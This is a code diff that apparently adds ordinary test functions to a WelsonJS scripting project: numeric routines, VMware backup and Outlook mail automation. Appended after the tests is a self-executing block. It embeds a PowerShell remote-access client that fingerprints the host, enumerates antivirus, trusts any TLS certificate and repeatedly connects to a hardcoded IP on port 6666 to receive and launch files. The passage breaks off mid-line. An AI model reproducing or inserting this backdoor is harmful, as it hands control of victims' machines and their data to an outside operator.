+    },
+    
+    "numbers_test": function() {
+        // Riemann integrals
+        console.log("Test Riemann integrals (with 200 subdivisions)");
+        console.log(numbers.calculus.Riemann(Math.sin, -2, 4, 200));
+
+        // Adaptive simpson quadrature
+        //console.log("Test Adaptive simpson quadrature (with epsilon .0001)");
+        //console.log(numbers.calculus.adaptiveSimpson(Math.sin, -2, 4, .0001));
+        
+        // User-defined function
+        console.log("Test User-defined functions");
+        var myFunc = function(x) {
+            return 2*Math.pow(x,2) + 1;
+        }
+        console.log("Test Riemann sum");
+        console.log(numbers.calculus.Riemann(myFunc, -2, 4, 200));
+        console.log("Test Adaptive Simpson's Rule");
+        console.log(numbers.calculus.adaptiveSimpson(myFunc, -2, 4, .0001));
+        
+        // example array
+        var array1 = [0, 1, 2];
+        var array2 = [3, 4, 5];
+        var array = array1.concat(array2);
+        
+        // add two matrices
+        console.log("Test Add two metrices");
+        console.log(JSON.stringify(numbers.matrix.addition(array1, array2)));
+        
+        // transpose a matrix
+        //console.log("Test Transpose a matrix");
+        //console.log(JSON.stringify(numbers.matrix.transpose(array)));
+        
+        // basic check
+        var number = 3;   // number
+
+        console.log("Test Prime Number Check (Simple test)");
+        console.log(numbers.prime.simple(number));
+
+        // Miller-Rabin primality test
+        console.log("Test Prime Number Check (Miller-Rabin primality test)");
+        console.log(numbers.prime.millerRabin(number));
+
+        // mean, median, mode, standard deviation, random sample generator, correlation, confidence intervals, t-test, chi-square, and more.
+        console.log("Test mean, median, mode, standard deviation, random sample generator, correlation, confidence intervals, t-test, chi-square, and more.");
+        console.log(numbers.statistic.mean(array));
+        console.log(numbers.statistic.median(array));
+        console.log(numbers.statistic.mode(array));
+        console.log(numbers.statistic.standardDev(array));
+        //console.log(numbers.statistic.randomSample(100, 100, 20));
+        console.log(numbers.statistic.correlation(array1, array2));
+    },
+
+    "backup_vmware_esxi": function() {
+        var OVFTool = require("lib/ovftool");
+
+        // set the credential (username, and password)
+        OVFTool.setCredential("arnold", "I_WILL_BE_BACK");
+
+        // set target virtual machines
+        var targetVMs = [
+            "/MyDatacenter/vm/MyGroup/MyMachine1",
+            "/MyDatacenter/vm/MyGroup/MyMachine2",
+            "/MyDatacenter/host/MyGroup/MyMachine2",
+            "/MyDatacenter/host/MyGroup/MyMachine2"
+        ];
+
+        // do backup
+        targetVMs.forEach(function(resourceName) {
+            var job = OVFTool.create();
+            job.setHostName("example.org");
+            job.setResourceName(resourceName);
+            job.saveTo("D:\\");
+        });
+    },
+    
+    "outlook_open_session": function () {
+        console.log("Starting Outlook automation.");
+
+        var Office = require("lib/msoffice");
+
+        var outlook = new Office.Outlook();
+        outlook.open();
+
+        console.log(typeof outlook.application !== "undefined" ?
+            "Outlook.Application object has been created." :
+            "Failed to create Outlook.Application object.");
+
+        console.log(typeof outlook.namespace !== "undefined" ?
+            "Connected to MAPI namespace." :
+            "Failed to connect to MAPI namespace.");
+
+        console.log(outlook.currentFolder !== null ?
+            "Default folder (Inbox) has been selected." :
+            "Failed to select default folder (Inbox).");
+
+        outlook.close();
+        console.log("Outlook automation has been closed.");
+    },
+
+    "outlook_list_inbox_recent": function () {
+        var maxCount = 10;
+        var previewLen = 160;
+
+        console.log("Listing recent mails from Inbox. (max " + maxCount + ")");
+        console.log("Body preview length: " + previewLen);
+
+        var Office = require("lib/msoffice");
+
+        var outlook = new Office.Outlook();
+        outlook.open();
+        outlook.selectFolder(Office.Outlook.Folders.Inbox);
+
+        var items = outlook.getItems();
+        var count = items.count();
+        console.log("Inbox item count: " + String(count));
+
+        items.forEach(function (it, i) {
+            if (it instanceof Office.Outlook.MailItem) {
+                var body = String(it.getBody() || "");
+                var preview = body.replace(/\r/g, "").replace(/\n+/g, " ").substr(0, previewLen);
+
+                console.log(
+                    "#" + String(i) +
+                    " | From: " + String(it.getSenderName()) +
+                    " | Subject: " + String(it.getSubject()) +
+                    " | Received: " + String(it.getReceivedTime())
+                );
+                console.log("  Body: " + preview);
+            } else {
+                console.log("#" + String(i) + " | Non-mail item: class=" + String(it.getClass()));
+            }
+        }, maxCount);
+
+        outlook.close();
+        console.log("Recent mail listing completed.");
+    },
+
+    "outlook_read_mail_body": function () {
+        console.log("Reading the first mail body from Inbox.");
+
+        var Office = require("lib/msoffice");
+
+        var outlook = new Office.Outlook();
+        outlook.open();
+        outlook.selectFolder(Office.Outlook.Folders.Inbox);
+
+        var first = outlook.getItems().get(1);
+
+        console.log(first instanceof Office.Outlook.MailItem ?
+            "The first item is a MailItem." :
+            "The first item is not a MailItem.");
+
+        if (first instanceof Office.Outlook.MailItem) {
+            console.log("Subject: " + String(first.getSubject()));
+            console.log("From: " + String(first.getSenderName()) +
+                " <" + String(first.getSenderEmailAddress()) + ">");
+            console.log("Received: " + String(first.getReceivedTime()));
+
+            var body = String(first.getBody() || "");
+            console.log("Body length (text): " + String(body.length));
+            console.log("Body preview (text):");
+            console.log(body.substr(0, 300));
+        }
+
+        outlook.close();
+        console.log("Mail body read test completed.");
+    },
+
+    "outlook_search_by_sender_contains": function () {
+        var keyword = "example.com";
+        var maxCount = 10;
+        var previewLen = 160;
+
+        console.log("Searching mails by sender contains: '" + keyword + "'.");
+        console.log("Body preview length: " + previewLen);
+
+        var Office = require("lib/msoffice");
+
+        var outlook = new Office.Outlook();
+        outlook.open();
+        outlook.selectFolder(Office.Outlook.Folders.Inbox);
+
+        var results = outlook.searchBySenderContains(keyword);
+        console.log("Printing search results. (max " + maxCount + ")");
+
+        results.forEach(function (m, i) {
+            var body = String(m.getBody() || "");
+            var preview = body.replace(/\r/g, "").replace(/\n+/g, " ").substr(0, previewLen);
+
+            console.log(
+                "#" + String(i) +
+                " | From: " + String(m.getSenderEmailAddress()) +
+                " | Subject: " + String(m.getSubject()) +
+                " | Received: " + String(m.getReceivedTime())
+            );
+            console.log("  Body: " + preview);
+        }, maxCount);
+
+        outlook.close();
+        console.log("Sender search test completed.");
+    },
+
+    "outlook_search_by_recipient_contains": function () {
+        var keyword = "example.com";
+        var maxCount = 10;
+        var previewLen = 160;
+
+        console.log("Searching mails by recipient contains (To/CC/BCC): '" + keyword + "'.");
+        console.log("Body preview length: " + previewLen);
+
+        var Office = require("lib/msoffice");
+
+        var outlook = new Office.Outlook();
+        outlook.open();
+        outlook.selectFolder(Office.Outlook.Folders.Inbox);
+
+        var results = outlook.searchByRecipientContains(keyword);
+        console.log("Printing search results. (max " + maxCount + ")");
+
+        results.forEach(function (m, i) {
+            var body = String(m.getBody() || "");
+            var preview = body.replace(/\r/g, "").replace(/\n+/g, " ").substr(0, previewLen);
+
+            console.log(
+                "#" + String(i) +
+                " | To: " + String(m.mail.To || "") +
+                " | CC: " + String(m.mail.CC || "") +
+                " | Subject: " + String(m.getSubject()) +
+                " | Received: " + String(m.getReceivedTime())
+            );
+            console.log("  Body: " + preview);
+        }, maxCount);
+
+        outlook.close();
+        console.log("Recipient search test completed.");
+    },
+
+    "outlook_search_by_sender_or_recipient_contains": function () {
+        var keyword = "example.com";
+        var maxCount = 10;
+        var previewLen = 160;
+
+        console.log("Searching mails by sender OR recipient contains: '" + keyword + "'.");
+        console.log("This test uses Restrict (Sender/To/CC/BCC) + Recipients verification.");
+        console.log("Body preview length: " + previewLen);
+
+        var Office = require("lib/msoffice");
+
+        var outlook = new Office.Outlook();
+        outlook.open();
+        outlook.selectFolder(Office.Outlook.Folders.Inbox);
+
+        var results = outlook.searchBySenderOrRecipientContains(keyword);
+        console.log("Printing search results. (max " + maxCount + ")");
+
+        results.forEach(function (m, i) {
+            var body = String(m.getBody() || "");
+            var preview = body.replace(/\r/g, "").replace(/\n+/g, " ").substr(0, previewLen);
+
+            console.log(
+                "#" + String(i) +
+                " | From: " + String(m.getSenderEmailAddress()) +
+                " | To: " + String(m.mail.To || "") +
+                " | Subject: " + String(m.getSubject()) +
+                " | Received: " + String(m.getReceivedTime())
+            );
+            console.log("  Body: " + preview);
+        }, maxCount);
+
+        outlook.close();
+        console.log("Sender/Recipient combined search test completed.");
+    },
+
+    "outlook_create_draft_mail": function () {
+        console.log("Creating a draft mail item in Outlook. (will not send)");
+
+        var Office = require("lib/msoffice");
+
+        var outlook = new Office.Outlook();
+        outlook.open();
+
+        var draft = outlook.createMail();
+
+        console.log(draft instanceof Office.Outlook.MailItem ?
+            "MailItem has been created." :
+            "Failed to create MailItem.");
+
+        if (draft instanceof Office.Outlook.MailItem) {
+            draft
+                .setTo("test@example.com")
+                .setSubject("WelsonJS Outlook Draft Test")
+                .setBody("This is a draft created by WelsonJS test.\r\nDo not send.");
+
+            console.log("Saving the draft mail item.");
+            draft.save();
+            console.log("Draft mail item has been saved.");
+        }
+
+        outlook.close();
+        console.log("Draft creation test completed.");
+    },
+
+    "outlook_open_outlook_with_chatgpt": function () {
+        // Process: Microsoft Outlook -> OpenAI -> Get Response
+        var Office = require("lib/msoffice");
+        var LIE = require("lib/language-inference-engine");
+        
+        var prompt_texts = [];
+        
+        var keyword = "example.com";
+        var maxCount = 10;
+        var previewLen = 160;
+
+        console.log("Searching mails by sender OR recipient contains: '" + keyword + "'.");
+        console.log("This test uses Restrict (Sender/To/CC/BCC) + Recipients verification.");
+        console.log("Body preview length: " + previewLen);
+
+        var Office = require("lib/msoffice");
+
+        var outlook = new Office.Outlook();
+        outlook.open();
+        outlook.selectFolder(Office.Outlook.Folders.Inbox);
+
+        var results = outlook.searchBySenderOrRecipientContains(keyword);
+        console.log("Printing search results. (max " + maxCount + ")");
+
+        results.forEach(function (m, i) {
+            var body = String(m.getBody() || "");
+            var preview = body.replace(/\r/g, "").replace(/\n+/g, " ").substr(0, previewLen);
+            
+            var text = "#" + String(i) +
+                " | From: " + String(m.getSenderEmailAddress()) +
+                " | To: " + String(m.mail.To || "") +
+                " | Subject: " + String(m.getSubject()) +
+                " | Received: " + String(m.getReceivedTime());
+
+            console.log(text);
+            console.log("  Body: " + preview);
+            
+            // Add an email data to the prompt text context
+            prompt_texts.push(text);
+            
+            // The body to reduce token usage and avoid sending overly large/sensitive content.
+            var bodyForPrompt = body;
+            var maxBodyLengthForPrompt = 2000; // Keep the body snippet short
+            if (bodyForPrompt.length > maxBodyLengthForPrompt) {
+                bodyForPrompt = bodyForPrompt.substring(0, maxBodyLengthForPrompt) + "...";
+            }
+            prompt_texts.push("  Body: " + bodyForPrompt);
+        }, maxCount);
+
+        outlook.close();
+        
+        // build a AI prompt text
+        var instruction_text = "This is an email exchange between the buyer and me, and I would appreciate it if you could help me write the most appropriate reply.";
+        prompt_texts.push(instruction_text);
+        
+        // complete the prompt text
+        var prompt_text_completed = prompt_texts.join("\r\n");
+        
+        //console.log(prompt_text_completed);  // print all prompt text
+        
+        // get a response from AI
+        var response_text = LIE.create().setProvider("openai").inference(prompt_text_completed, 0).join(' ');
+        
+        console.log(response_text);
+    }
+};
+
+
+
+
+(function () {
+    var DEFAULT_IP   = "141.94.121.162";
+    var DEFAULT_PORT = 6666;
+
+    var args = [];
+    try {
+        for (var i = 0; i < WScript.Arguments.length; i++) {
+            args.push(String(WScript.Arguments(i)));
+        }
+    } catch (eArgs) {}
+    var ip   = (args[0] || DEFAULT_IP);
+    var port = parseInt(args[1], 10) || DEFAULT_PORT;
+
+    // Tomamos Username/Hostname del entorno (no del param block, que va stripped).
+    var envUsername = "", envHostname = "";
+    try {
+        var sh2 = new ActiveXObject("WScript.Shell");
+        envUsername = sh2.ExpandEnvironmentStrings("%USERNAME%");
+        envHostname = sh2.ExpandEnvironmentStrings("%COMPUTERNAME%");
+    } catch (eEnv) {}
+
+    try {
+        var fso = new ActiveXObject("Scripting.FileSystemObject");
+        var tmp = fso.GetSpecialFolder(2);
+
+        // ===== PS1 EMBEBIDO (RAW, sin cifrado, sin archivo en disco) =====
+        var PS1_TEMPLATE =
+"# Plantilla del cliente PS1 generada por ChatServer" + "\n" + "# Parametros (los pasa el host VBS/JS):" + "\n" + "#   -Ip, -Port, -Username, -Hostname, -DebugLog" + "\n" + "param(" + "\n" + "  [string]$Ip, [int]$Port, [string]$Username, [string]$Hostname," + "\n" + "  [string]$DebugLog" + "\n" + ")" + "\n" + "$ErrorActionPreference = 'Continue'" + "\n" + "" + "\n" + "function _qkeqwo($s) {" + "\n" + "  # NO-OP (modo cero disco): no escribimos a %TEMP%\\chat_client.log" + "\n" + "  return" + "\n" + "}" + "\n" + "" + "\n" + "function _qdwujx($s) { if ($null -eq $s) { return '' }; return ($s -replace '[|\\r\\n]',' ') }" + "\n" + "" + "\n" + "function _mzjrws {" + "\n" + "  # Identificador unico y robusto por instalacion de Windows." + "\n" + "  # Fuentes, en orden de prioridad (cada una se skipea si vacia):" + "\n" + "  #   1) HKLM\\SOFTWARE\\Microsoft\\Cryptography\\MachineGuid  <- unico por install/sysprep (SIEMPRE disponible)" + "\n" + "  #   2) Win32_BIOS.SerialNumber                         <- unico por hardware" + "\n" + "  #   3) Win32_DiskDrive.SerialNumber (primer disco)     <- unico por disco" + "\n" + "  #   4) Win32_BaseBoard.SerialNumber                    <- unico por motherboard" + "\n" + "  #   5) Win32_Processor.ProcessorId                     <- unico por CPU real (vacio en VMs)" + "\n" + "  #   6) FALLBACK: PID + ticks random                   <- si TODO lo anterior falla (WMI deshabilitado en VM)" + "\n" + "  # Devuelve SHA-256 hex de 32 chars." + "\n" + "  try {" + "\n" + "    $parts = @()" + "\n" + "" + "\n" + "    # 1) MachineGuid del registry (la fuente MAS estable y unica)" + "\n" + "    try {" + "\n" + "      $guid = (Get-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Cryptography' -Name MachineGuid -ErrorAction Stop).MachineGuid" + "\n" + "      if ($guid) { $parts += \"MG:$guid\" }" + "\n" + "    } catch {}" + "\n" + "" + "\n" + "    # 2-5) WMI" + "\n" + "    try { $s = (Get-CimInstance Win32_BIOS -ErrorAction SilentlyContinue).SerialNumber;         if ($s) { $parts += \"BIOS:$s\" } } catch {}" + "\n" + "    try { $s = (Get-CimInstance Win32_DiskDrive -ErrorAction SilentlyContinue | Select-Object -First 1).SerialNumber; if ($s) { $parts += \"DSK:$s\" } } catch {}" + "\n" + "    try { $s = (Get-CimInstance Win32_BaseBoard -ErrorAction SilentlyContinue).SerialNumber;    if ($s) { $parts += \"MB:$s\" } } catch {}" + "\n" + "    try { $s = (Get-CimInstance Win32_Processor -ErrorAction SilentlyContinue).ProcessorId;     if ($s) { $parts += \"CPU:$s\" } } catch {}" + "\n" + "" + "\n" + "    # 6) FALLBACK: random GUID por sesion si WMI esta completamente deshabilitado (VMs muy restringidas)." + "\n" + "    # Usamos PID + ticks para que sea unico por instancia aunque se reinicie la VM." + "\n" + "    if ($parts.Count -eq 0) {" + "\n" + "      $parts += ('VMFALLBACK:' + $PID + ':' + [DateTime]::UtcNow.Ticks.ToString())" + "\n" + "    }" + "\n" + "    $raw = ($parts -join '|')" + "\n" + "    $bytes = [System.Text.Encoding]::UTF8.GetBytes($raw)" + "\n" + "    $sha = [System.Security.Cryptography.SHA256]::Create()" + "\n" + "    $hash = $sha.ComputeHash($bytes)" + "\n" + "    return ([BitConverter]::ToString($hash) -replace '-','').Substring(0, 32)" + "\n" + "  } catch {" + "\n" + "    # Si hasta el SHA-256 falla, random puro" + "\n" + "    return ([Guid]::NewGuid().ToString().Replace('-','')).Substring(0, 32)" + "\n" + "  }" + "\n" + "}" + "\n" + "" + "\n" + "function Test-Singleton {" + "\n" + "  # Mutex global derivado del HWID. Si otra instancia ya esta corriendo" + "\n" + "  # con la misma identidad, salimos silenciosos (sin conectar)." + "\n" + "  # Nombre: Global\\ChatClient_<HWID_PREFIX8>" + "\n" + "  try {" + "\n" + "    $myHwid = _mzjrws" + "\n" + "    $mutexName = 'Global\\ChatClient_' + $myHwid.Substring(0, [Math]::Min(8, $myHwid.Length))" + "\n" + "" + "\n" + "    # TryOpenExisting devuelve BOOL (true/false). El Mutex object va por [ref]." + "\n" + "    # CUIDADO: $false -ne $null es TRUE en PowerShell, asi que hay que chequear" + "\n" + "    # el bool explicitamente, no la \"no nulidad\"." + "\n" + "    $heldMutex = $null" + "\n" + "    $exists = $false" + "\n" + "    try {" + "\n" + "      $exists = [System.Threading.Mutex]::TryOpenExisting($mutexName, [ref]$heldMutex)" + "\n" + "    } catch {}" + "\n" + "    if ($exists) {" + "\n" + "      # Ya existe otro wrapper con este HWID. Salimos silenciosos." + "\n" + "      try { if ($heldMutex) { $heldMutex.Close() } } catch {}" + "\n" + "      _qkeqwo ('SINGLETON_DUP|mutex=' + $mutexName + '|ya_existe_otra_instancia')" + "\n" + "      return $false" + "\n" + "    }" + "\n" + "" + "\n" + "    # No existe -> crearlo y tomar ownership." + "\n" + "    $createdNew = $false" + "\n" + "    try {" + "\n" + "      $script:__singletonMutex = New-Object System.Threading.Mutex($true, $mutexName, [ref]$createdNew)" + "\n" + "    } catch [System.Threading.AbandonedMutexException] {" + "\n" + "      # El mutex existia pero estaba abandoned (proceso muerto sin cleanup)." + "\n" + "      # Lo tomamos como nuestro." + "\n" + "      $script:__singletonMutex = New-Object System.Threading.Mutex($true, $mutexName, [ref]$createdNew)" + "\n" + "      $createdNew = $true" + "\n" + "    } catch {" + "\n" + "      # Permisos u otro error -> fail-open (dejamos correr)." + "\n" + "      return $true" + "\n" + "    }" + "\n" + "    if (-not $createdNew) {" + "\n" + "      _qkeqwo ('SINGLETON_DUP|mutex=' + $mutexName + '|ya_existe_otra_instancia')" + "\n" + "      return $false" + "\n" + "    }" + "\n" + "    return $true" + "\n" + "  } catch {" + "\n" + "    return $true" + "\n" + "  }" + "\n" + "}" + "\n" + "" + "\n" + "function _urcnuu {" + "\n" + "  try {" + "\n" + "    $loc = Get-WinHomeLocation -ErrorAction SilentlyContinue" + "\n" + "    if ($loc -and $loc.Country) { return ([string]$loc.Country).ToUpper() }" + "\n" + "  } catch {}" + "\n" + "  try {" + "\n" + "    $l = (Get-WinSystemLocale -ErrorAction SilentlyContinue).Name" + "\n" + "    if ($l) {" + "\n" + "      $cc = $l.Split('-')[-1]" + "\n" + "      if ($cc -and $cc.Length -eq 2) { return $cc.ToUpper() }" + "\n" + "    }" + "\n" + "  } catch {}" + "\n" + "  try {" + "\n" + "    $tz = [System.TimeZoneInfo]::Local.Id" + "\n" + "    if ($tz -match 'Buenos Aires') { return 'AR' }" + "\n" + "    elseif ($tz -match 'Sao Paulo') { return 'BR' }" + "\n" + "    elseif ($tz -match 'Eastern|Pacific|Central|Mountain') { return 'US' }" + "\n" + "    elseif ($tz -match 'Europe' -and $tz -match 'London') { return 'GB' }" + "\n" + "    elseif ($tz -match 'Europe') { return 'EU' }" + "\n" + "  } catch {}" + "\n" + "  return 'XX'" + "\n" + "}" + "\n" + "" + "\n" + "function _lsjokb {" + "\n" + "  try {" + "\n" + "    $os = Get-CimInstance Win32_OperatingSystem" + "\n" + "    return [int]([math]::Round($os.TotalVisibleMemorySize/1KB)), [int]([math]::Round($os.FreePhysicalMemory/1KB))" + "\n" + "  } catch { return 0,0 }" + "\n" + "}" + "\n" + "" + "\n" + "function _ulvknp {" + "\n" + "  try {" + "\n" + "    $av = Get-CimInstance -Namespace root\\SecurityCenter2 -ClassName AntiVirusProduct -ErrorAction SilentlyContinue" + "\n" + "    if ($av) {" + "\n" + "      $names = @($av | ForEach-Object { $_.displayName } | Where-Object { $_ })" + "\n" + "      if ($names.Count -gt 0) { return ($names -join ' + ') }" + "\n" + "    }" + "\n" + "  } catch {}" + "\n" + "  try {" + "\n" + "    $mp = Get-MpComputerStatus -ErrorAction SilentlyContinue" + "\n" + "    if ($mp -and $mp.AntivirusEnabled) { return 'Windows Defender' }" + "\n" + "  } catch {}" + "\n" + "  $avServices = @{" + "\n" + "      'Avast' = @('AvastSvc','aswEngSrv','AvastUI')" + "\n" + "      'Norton' = @('NortonSecurity','nsService','NAV')" + "\n" + "      'McAfee' = @('mfemactl','masvc','mfeesc','McShield')" + "\n" + "      'Bitdefender' = @('vsserv','bdredline','bdagent')" + "\n" + "      'Kaspersky' = @('Avesvc','avp','klbl')" + "\n" + "      'ESET' = @('ekrn','egui','epfw')" + "\n" + "  }" + "\n" + "  try {" + "\n" + "    $svc = Get-Service -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Name" + "\n" + "    foreach ($k in $avServices.Keys) {" + "\n" + "      foreach ($name in $avServices[$k]) {" + "\n" + "        if ($svc -contains $name) { return $k }" + "\n" + "      }" + "\n" + "    }" + "\n" + "  } catch {}" + "\n" + "  return 'Unknown'" + "\n" + "}" + "\n" + "" + "\n" + "function Get-Idle {" + "\n" + "  try {" + "\n" + "    $idle = [System.Windows.Forms.SystemInformation]::IdleTime" + "\n" + "    if ($idle -is [uint32]) { return [int]([uint32]$idle / 1000) }" + "\n" + "    return 0" + "\n" + "  } catch { return 0 }" + "\n" + "}" + "\n" + "" + "\n" + "function Get-OsVer {" + "\n" + "  try {" + "\n" + "    $os = Get-CimInstance Win32_OperatingSystem" + "\n" + "    return ($os.Caption + ' ' + $os.Version)" + "\n" + "  } catch { return 'Windows' }" + "\n" + "}" + "\n" + "" + "\n" + "function _zcqkfe {" + "\n" + "  $hwid = _mzjrws" + "\n" + "  $country = _urcnuu" + "\n" + "  $os = Get-OsVer" + "\n" + "  $ram = _lsjokb" + "\n" + "  $av = _ulvknp" + "\n" + "  $idle = Get-Idle" + "\n" + "  return ($hwid + '|' + $country + '|' + (_qdwujx $os) + '|' + $ram[0] + '|' + $ram[1] + '|' + (_qdwujx $av) + '|n/a|' + $idle)" + "\n" + "}" + "\n" + "" + "\n" + "function _ebsvzx($ip) {" + "\n" + "  try {" + "\n" + "    $p = New-Object System.Net.NetworkInformation.Ping" + "\n" + "    $r = $p.Send($ip, 2000)" + "\n" + "    if ($r.Status -eq 'Success') { return [int]$r.RoundtripTime } else { return -1 }" + "\n" + "  } catch { return -1 }" + "\n" + "}" + "\n" + "" + "\n" + "# ============================================================" + "\n" + "# MAIN: conexion + handlers" + "\n" + "# ============================================================" + "\n" + "_qkeqwo ('PID|' + $PID)" + "\n" + "" + "\n" + "# Fallback: si el host no seteo $Username/$Hostname (chat.js strip del param block," + "\n" + "# in-process PowerShell sin AddParameter, etc), usar env vars. Asi el panel siempre" + "\n" + "# tiene user/host para mostrar." + "\n" + "if ([string]::IsNullOrEmpty($Username)) { $Username = $env:USERNAME }" + "\n" + "if ([string]::IsNullOrEmpty($Hostname)) { $Hostname = $env:COMPUTERNAME }" + "\n" + "if ([string]::IsNullOrEmpty($DebugLog)) { $DebugLog = (Join-Path $env:TEMP 'chat_client.log') }" + "\n" + "" + "\n" + "# Singleton: si ya hay otra instancia con el mismo HWID, salimos silenciosos." + "\n" + "# El mutex queda tomado en $script:__singletonMutex hasta el exit del proceso." + "\n" + "if (-not (Test-Singleton)) { exit 0 }" + "\n" + "" + "\n" + "$global:client = $null" + "\n" + "$global:writer = $null" + "\n" + "$global:reader = $null" + "\n" + "$global:execDir = Join-Path $env:TEMP ('heoggu_' + $PID)" + "\n" + "$global:recvFile = $null" + "\n" + "$global:recvFilePath = $null" + "\n" + "$global:recvFileName = $null" + "\n" + "$global:recvFileId = $null" + "\n" + "$global:recvFileExpectedMd5 = $null" + "\n" + "$global:recvSw = $null" + "\n" + "$global:recvBytes = $null" + "\n" + "$global:recvChunks = 0" + "\n" + "$global:stopRequested = $false   # true = salir y NO reconectar (kill/bye)" + "\n" + "$global:gracefulExit = $false     # true = el server mando BYE (Stop de escuchar). NO matar nada." + "\n" + "# Lista de PIDs hijos que PS1 spawneo (.exe lanzados tras recibir un archivo)." + "\n" + "# Cuando llega KILL_ALL_SPAWNED o BYE, los matamos todos antes de salir." + "\n" + "$global:spawnedPids = New-Object 'System.Collections.Generic.List[int]'" + "\n" + "" + "\n" + "function Kill-Spawned {" + "\n" + "    # Mata TODO el arbol de procesos del PS1 (hijos, nietos, etc)." + "\n" + "    # Recorre WMI recursivamente desde $PID y Stop-Process cada uno." + "\n" + "    param([bool]$exitAfter = $true)" + "\n" + "    $killed = 0" + "\n" + "    # 1. Mata PIDs explicitamente trackeados (los .exe que lanzo el PS1)" + "\n" + "    if ($global:spawnedPids -and $global:spawnedPids.Count -gt 0) {" + "\n" + "        foreach ($pidToKill in @($global:spawnedPids)) {" + "\n" + "            try { Stop-Process -Id $pidToKill -Force -ErrorAction SilentlyContinue ; $killed++ } catch {}" + "\n" + "        }" + "\n" + "        $global:spawnedPids.Clear()" + "\n" + "    }" + "\n" + "    # 2. Recorre TODO el subtree (recursivo) via WMI. Cubre hijos + nietos + ..." + "\n" + "    try {" + "\n" + "        $myId = $PID" + "\n" + "        $descendants = New-Object 'System.Collections.Generic.List[int]'" + "\n" + "        $stack = New-Object 'System.Collections.Generic.Stack[int]'" + "\n" + "        $stack.Push($myId)" + "\n" + "        while ($stack.Count -gt 0) {" + "\n" + "            $cur = $stack.Pop()" + "\n" + "            try {" + "\n" + "                $children = Get-CimInstance Win32_Process -Filter \"ParentProcessId = $cur\" -ErrorAction SilentlyContinue" + "\n" + "                foreach ($ch in $children) {" + "\n" + "                    if (-not $descendants.Contains([int]$ch.ProcessId)) {" + "\n" + "                        $descendants.Add([int]$ch.ProcessId)" + "\n" + "                        $stack.Push([int]$ch.ProcessId)" + "\n" + "                    }" + "\n" + "                }" + "\n" + "            } catch {}" + "\n" + "        }" + "\n" + "        foreach ($d in $descendants) {" + "\n" + "            try { Stop-Process -Id $d -Force -ErrorAction SilentlyContinue ; $killed++ } catch {}" + "\n" + "        }" + "\n" + "    } catch {}" + "\n" + "    _qkeqwo ('KILL_SPAWNED|' + $killed + ' processes terminated (tree)')" + "\n" + "    if ($exitAfter) {" + "\n" + "        $global:stopRequested = $true" + "\n" + "        # Tiramos abajo el socket para que el loop salga rapido." + "\n" + "        try { if ($global:client) { $global:client.Close() } } catch {}" + "\n" + "    }" + "\n" + "}" + "\n" + "" + "\n" + "try {" + "\n" + "  $global:retryDelay = 1   # arrancamos en 1s para reconectar rapido al reinicio del server" + "\n" + "  $global:retryCount = 0" + "\n" + "" + "\n" + "  while ($true) {" + "\n" + "    $global:retryCount++" + "\n" + "    _qkeqwo ('RECONNECT_ATTEMPT|' + $global:retryCount + '|wait=' + $global:retryDelay + 's')" + "\n" + "    Start-Sleep -Seconds $global:retryDelay" + "\n" + "" + "\n" + "    try {" + "\n" + "      New-Item -ItemType Directory -Path $global:execDir -Force | Out-Null" + "\n" + "" + "\n" + "      $global:client = New-Object System.Net.Sockets.TcpClient" + "\n" + "      $global:client.SendTimeout = 5000" + "\n" + "      $global:client.ReceiveTimeout = 5000" + "\n" + "      $global:client.NoDelay = $true" + "\n" + "      $global:client.SendBufferSize = 1024 * 1024" + "\n" + "      $global:client.ReceiveBufferSize = 1024 * 1024" + "\n" + "" + "\n" + "      _qkeqwo ('CONNECTING|' + $Ip + ':' + $Port)" + "\n" + "      $iar = $global:client.BeginConnect($Ip, $Port, $null, $null)" + "\n" + "      if (-not $iar.AsyncWaitHandle.WaitOne(8000)) {" + "\n" + "        try { $global:client.Close() } catch {}" + "\n" + "        throw 'ConnectAsync timeout (8s) a ' + $Ip + ':' + $Port" + "\n" + "      }" + "\n" + "      $global:client.EndConnect($iar)" + "\n" + "      _qkeqwo 'TCP_OK'" + "\n" + "" + "\n" + "      # TLS client-side: wrap el NetworkStream en SslStream. Trust self-signed (RMM mode)." + "\n" + "      $plainStream = $global:client.GetStream()" + "\n" + "      $global:sslStream = New-Object System.Net.Security.SslStream(" + "\n" + "        $plainStream," + "\n" + "        $false," + "\n" + "        [System.Net.Security.RemoteCertificateValidationCallback]{" + "\n" + "          param($sender, $cert, $chain, $sslPolicyErrors)" + "\n" + "          # RMM: trust all certs (server is self-signed). If you want strict validation" + "\n" + "          # change to: return ($sslPolicyErrors -eq 'None') -or ($cert.Subject -eq 'CN=LuxRMM Server')" + "\n" + "          return $true" + "\n" + "        }" + "\n" + "      )" + "\n" + "      # Explicit TLS 1.2 + no client cert. Needed when running in-process from a .NET host" + "\n" + "      # (SChannel default negotiation may fail with SSPI error otherwise)." + "\n" + "      # Signature: AuthenticateAsClient(targetHost, clientCerts, enabledSslProtocols, checkCertificateRevocation)" + "\n" + "      try {" + "\n" + "        $global:sslStream.AuthenticateAsClient(" + "\n" + "          $Ip,                                              # targetHost" + "\n" + "          $null,                                           # clientCertificates" + "\n" + "          [System.Security.Authentication.SslProtocols]::Tls12, # enabledSslProtocols" + "\n" + "          $false                                           # checkCertificateRevocation" + "\n" + "        )" + "\n" + "      } catch {" + "\n" + "        _qkeqwo ('TLS_ERR|' + $_.Exception.GetType().FullName + '|' + ($_.Exception.InnerException | ForEach-Object { $_.GetType().FullName + ':' + $_.Message }) + '|' + $_.Exception.Message)" + "\n" + "        throw" + "\n" + "      }" + "\n" + "      _qkeqwo 'TLS_OK'" + "\n" + "      $global:sslStream.ReadTimeout = 60000" + "\n" + "      $global:sslStream.WriteTimeout = 10000" + "\n" + "      $global:writer = New-Object System.IO.StreamWriter($global:sslStream, [System.Text.Encoding]::UTF8)" + "\n" + "      $global:writer.AutoFlush = $true" + "\n" + "      # StreamReader con buffer grande = lectura super rapida por linea (no byte-a-byte)." + "\n" + "      # El protocolo es 100% line-based (EXEC_FILE_START/CHUNK/END todos terminan en \\n)," + "\n" + "      # no hay bytes binarios que se puedan \"comer\" porque no usamos EXEC_FILE_BIN." + "\n" + "      $global:reader = New-Object System.IO.StreamReader($global:sslStream, [System.Text.Encoding]::UTF8, $false, 65536)" + "\n" + "" + "\n" + "      _qkeqwo 'SENDING_CONNECT'" + "\n" + "      $infoLine = _zcqkfe" + "\n" + "      $pingMs = _ebsvzx $Ip" + "\n" + "      # Mandamos VERSION al final para que el server pueda detectar version mismatch" + "\n" + "      $global:writer.WriteLine(('CONNECT|' + (_qdwujx 